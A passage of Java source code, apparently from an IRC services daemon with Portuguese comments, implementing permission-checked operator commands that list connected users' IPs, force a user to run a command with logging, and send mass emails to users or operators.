                        // buffer de saida
                        StringBuffer saida = new StringBuffer("");

                        // lista os usuarios
                        for (Enumeration enu = Server.getUserElements(); enu.hasMoreElements(); ) {

                            User temp = (User) enu.nextElement();

                            // imprime: nick (nick!ident@ip) realname
                            saida.append("-> " + temp.getNick() + " (" + temp.getIP() + ")<br>");

                        }

                        Message.noticeSvs(tmpUser, svs, saida.toString());

                    } else {

                        // permissao negada, voce nao eh ircop
                        Message.noticeSvs(tmpUser, svs, Lang.traduz(tmpUser, "operserv_039", Config.NETWORK + "%%" + usuario));

                    }

                } else if (com1.equals("SLAYER")) {

                    // se usuario for ircop ou admin
                    if (tmpUser.isIRCop() || tmpUser.isAdmin()) {

                        if (st.countTokens() >= 2) {

                            // pega nick e instancia do user
                            String vitima = st.nextToken();
                            User tmpID = Server.getUser(vitima);

                            // se usuario existir
                            if (tmpID != null) {

                                // pega o comando
                                String comando = cmd.substring(17 + vitima.length());
                                if (comando.charAt(0) == '/')
                                    comando = comando.substring(1);

                                // envia mensagem de aviso para ircops
                                Message.noticeOpers(Lang.traduz(tmpUser, "operserv_055", usuario + "%%" + vitima + "%%" + comando));

                                // execute comando
                                super.invoca(tmpID, comando);

                                // registra no log
                                new LogOpers(usuario, tmpUser.getHost(), cmd + "");

                            }

                        } else {

                            // comando inexistente, exemplo correto �
                            StringBuffer exemplo = new StringBuffer(Lang.traduz(tmpUser, "webchat_010", ""));
                            exemplo.append("/operserv slayer John NICK Xiquita<br>");
                            Message.noticeSvs(tmpUser, svs, exemplo.toString());

                        }

                    } else {

                        // permissao negada, voce nao eh ircop
                        Message.noticeSvs(tmpUser, svs, Lang.traduz(tmpUser, "operserv_039", Config.NETWORK + "%%" + usuario));

                    }

                } else if (com1.equals("MAILUSERS")) {

                    // se usuario for admin
                    if (tmpUser.isAdmin()) {

                        if (st.countTokens() > 1) {

                            String mensagem = cmd.substring(19);

                            // se email foi enviado com sucesso
                            if (sendMailUsers(tmpUser, mensagem)) {

                                // avisa que emails foram enviados com sucesso
                                Message.noticeSvs(tmpUser, svs, Lang.traduz(tmpUser, "operserv_058", ""));

                            } else {

                                // avisa que emails nao puderam ser enviados
                                Message.noticeSvs(tmpUser, svs, Lang.traduz(tmpUser, "operserv_085", ""));

                            }

                        } else {

                            // comando inexistente, exemplo correto �
                            StringBuffer exemplo = new StringBuffer(Lang.traduz(tmpUser, "webchat_010", ""));
                            exemplo.append("/operserv mailusers blah blah message...<br>");
                            Message.noticeSvs(tmpUser, svs, exemplo.toString());

                        }

                    } else {

                        // avisa que apenas admin podem usar o recurso
                        Message.noticeSvs(tmpUser, svs, Lang.traduz(tmpUser, "operserv_032", ""));

                    }

                } else if (com1.equals("MAILOPERS")) {

                    // se usuario for ircop
                    if (tmpUser.isIRCop() || tmpUser.isAdmin()) {

                        if (st.countTokens() > 1) {

                            String mensagem = cmd.substring(19);

                            // se email for enviado
                            if (sendMailOpers(tmpUser, mensagem)) {

                                // avisa que emails foram enviados com sucesso
                                Message.noticeSvs(tmpUser, svs, Lang.traduz(tmpUser, "operserv_058", ""));

                            } else {

                                // avisa que emails nao puderam ser enviados
                                Message.noticeSvs(tmpUser, svs, Lang.traduz(tmpUser, "operserv_085", ""));

                            }

                        } else {

                            // comando inexistente, exemplo correto �
                            StringBuffer exemplo = new StringBuffer(Lang.traduz(tmpUser, "webchat_010", ""));
                            exemplo.append("/operserv mailopers blah blah message...<br>");
                            Message.noticeSvs(tmpUser, svs, exemplo.toString());

                        }

                    } else {

                        // avisa que apenas admin podem usar o recurso
                        Message.noticeSvs(tmpUser, svs, Lang.traduz(tmpUser, "operserv_032", ""));

                    }

                } else {

                    // avisa que comando nao existe
                    Message.noticeSvs(tmpUser, svs, Lang.traduz(tmpUser, "operserv_063", ""));

                }

            }

        } catch (Exception e) {

            new LogIRCd("OperServ.java", "execute(" + cmd + ")", "" + e);

        }

    }

    private boolean sendMailUsers(User tmpUser, String mensagem) {

        try {

            // pega lista de usuarios nao forbidados do nickserv
            ArrayList usuarios = SQLQuery.getAll();

            // se lista nao estiver vazia
            if (!usuarios.isEmpty()) {

                // lista usuarios
                for (Object separa : usuarios) {

                    String nick = separa.toString();
                    String mail = SQLQuery.getEmail(nick);
                    String msg = Lang.traduz(tmpUser, "operserv_022", nick + "%%" + mensagem + "%%" + tmpUser.getNick() + "%%" + Config.NETWORK);

                    // cria instancia de email
                    Mail email = new Mail(mail, Config.NETWORK, msg);

                    // envia email
                    if (!email.envia())
                        return false;

                }

            }

        } catch (Exception e) {

            new LogIRCd("OperServ.java", "sendMailUsers()", "" + e);

        }

        return true;

    }

    private boolean sendMailOpers(User tmpUser, String mensagem) {

        try {

            // pega lista de ircops
            ArrayList emails = SQLQuery.getAllEmails();

            // se lista nao estiver vazia
            if (!emails.isEmpty()) {

                // lista ircops
                for (Object mail : emails) {

                    String msg = Lang.traduz(tmpUser, "operserv_060", mensagem + "%%" + tmpUser.getNick() + "%%" + Config.NETWORK);

                    // cria instancia de email
                    Mail email = new Mail((String) mail, Config.NETWORK, msg);

                    // envia email
                    if (!email.envia())
                        return false;

                }

            }

        } catch (Exception e) {

            new LogIRCd("OperServ.java", "sendMailOpers()", "" + e);

        }

        return true;

    }
}
